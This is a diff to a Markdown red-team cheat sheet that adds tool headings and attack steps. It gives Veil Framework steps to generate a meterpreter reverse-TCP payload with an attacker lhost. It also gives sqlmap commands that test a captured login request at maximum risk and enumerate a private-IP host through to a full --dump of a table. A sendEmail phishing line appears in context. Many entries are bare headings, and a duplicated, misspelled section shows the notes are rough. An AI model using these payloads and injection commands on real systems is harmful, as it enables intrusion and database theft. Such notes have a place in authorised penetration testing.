@@ -20,6 +20,11 @@ Create a new Advanced Scan
 
 ## Web Application Reconnaissance
 ### Vega
+### Acunetix
+### Burp Suite
+### Nessus
+### Nikto
+### Nmap Scripting Engine
 
 ## Payload Generation
 ### Cobalt Strike
@@ -29,7 +34,20 @@ start Veil Framework navigate to the /Veil Framwork directory.
 ```
 ./Veil.py
 ```
-Run the ` list ` command to show Available Tools.
+If you have the ability to select between "Evasion and Ordnance" use Evasion. 
+Run the "list" command to show Available Tools.
+Use the 'python/meterpreter/rev_tcp.py' option from the list. Example below
+```
+use 28
+```
+The check the Required Options. 
+```
+options
+```
+Set the lhost ip address. 
+Now you can Generate the payload. 
+
+
 
 ## Listeners
 ### Cobalt Strike
@@ -50,3 +68,28 @@ sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
 
 ## Enumeration
 PowerSploit
+
+## Directory Brute Force
+### Aquatone
+### EyeWitness
+
+## Directory Bruce-Force
+### DirBuster
+### Gobuster
+
+## Exploitation
+### Burp Suite
+### Metasploit
+### SearchSploit
+### sqlmap
+create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
+```
+sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
+```
+Basic sqlmap command usage
+```
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
+sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
+```
